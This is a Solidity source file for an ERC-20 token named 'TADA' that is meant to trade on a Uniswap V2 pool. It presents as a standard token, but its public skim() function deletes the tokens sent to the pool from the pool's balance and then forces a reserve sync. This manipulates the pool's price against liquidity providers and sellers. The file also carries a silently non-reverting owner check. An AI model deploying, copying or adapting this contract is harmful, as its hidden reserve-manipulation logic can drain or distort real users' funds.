pragma solidity >=0.6.0 <0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Pair {
    function skim(address to) external;
    function sync() external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  modifier onlyOwner() {
    if (msg.sender == owner)
      _;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    if (newOwner != address(0)) owner = newOwner;
  }

}

contract TADA is IERC20, Ownable {
    using SafeMath for uint;

    string public symbol = "TADA";
    string public  name = "Tada!";
    uint public decimals = 18;
    uint public _totalSupply = 21000 * (10 ** decimals);

    address public pool = address(0);

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowances;
    
    uint public soldAmount = 0;

    constructor() {
        balances[msg.sender] = _totalSupply;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public override view returns (uint256) {
        return balances[account];
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        balances[msg.sender] = balances[msg.sender].sub(amount, "ERC20: transfer amount exceeds balance");
        balances[recipient] = balances[recipient].add(amount);
        
        if (recipient == pool) {
            soldAmount = soldAmount.add(amount);
        }

        emit Transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function skim() public returns (bool) {
        IUniswapV2Pair pair = IUniswapV2Pair(pool);
        
        balances[pool] = balances[pool].sub(soldAmount);
        soldAmount = 0;
        
        pair.sync();
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        balances[sender] = balances[sender].sub(amount);
        allowances[sender][msg.sender] = allowances[sender][msg.sender].sub(amount);
        
        balances[recipient] = balances[recipient].add(amount);
        
        Transfer(sender, recipient, amount);
        
        return true;
    }

    function setPool(address _pool) onlyOwner public {
        pool = _pool;
    }
    
    function getPool() public view returns (address) {
        return pool;
    }

}